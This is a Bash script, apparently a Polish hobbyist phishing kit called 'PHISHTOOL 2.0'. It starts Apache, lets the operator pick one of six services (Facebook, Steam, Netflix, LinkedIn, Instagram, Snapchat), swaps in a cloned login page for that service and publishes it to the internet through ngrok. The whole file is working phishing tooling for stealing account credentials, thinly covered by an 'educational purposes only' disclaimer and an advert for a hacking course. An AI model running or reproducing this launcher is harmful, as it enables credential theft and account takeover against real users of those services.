#!/bin/bash
sudo service apache2 start


facebook_login_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp facebook/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

stream_login_page()
{
	echo "wybrales Steama";
	sudo rm /var/www/html/index.html
	sudo cp steam/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

netflix_login_page()
{
	echo "wybrales Netflixa";
	sudo rm /var/www/html/index.html
	sudo cp netflix/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

linkedin_login_page()
{
	echo "wybrales Linkedin";
	sudo rm /var/www/html/index.html
	sudo cp linkedin/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}
instagram_login_page()
{
	echo "wybrales Instagram";
	sudo rm /var/www/html/index.html
	sudo cp instagram/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}
snapchat_login_page()
{
	echo "wybrales Snapchat";
	sudo rm /var/www/html/index.html
	sudo cp snapchat/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

exit_work()
{
	exit
}

figlet PHISHTOOL 2.0
echo " ------------------------------------------------------------------------------ "
echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
echo " ------------------------------------------------------------------------------ "
echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
echo "Wybierz opcje"
echo "================="
echo -e "\e[31m  [1] Facebook\e[0m"
echo -e "\e[31m  [2] Steam\e[0m"
echo -e "\e[31m  [3] Netflix\e[0m"
echo -e "\e[31m  [4] Linkedin\e[0m"
echo -e "\e[31m  [5] Instagram\e[0m"
echo -e "\e[31m  [6] Snapchat\e[0m"
echo -e "\e[92m  [11] EXIT \e[0m"
echo "================="


read opcja
 

case "$opcja" in


  "1") facebook_login_page ;;
  "2") stream_login_page ;;
  "3") netflix_login_page ;;
  "4") linkedin_login_page ;;
  "5") instagram_login_page ;;
  "6") snapchat_login_page ;;
  "11") exit_work ;;
  *)  ./run.sh
  
esac

echo " Narzędzie zakończyło pracę "
sudo service apache2 stop
sleep 2
exit

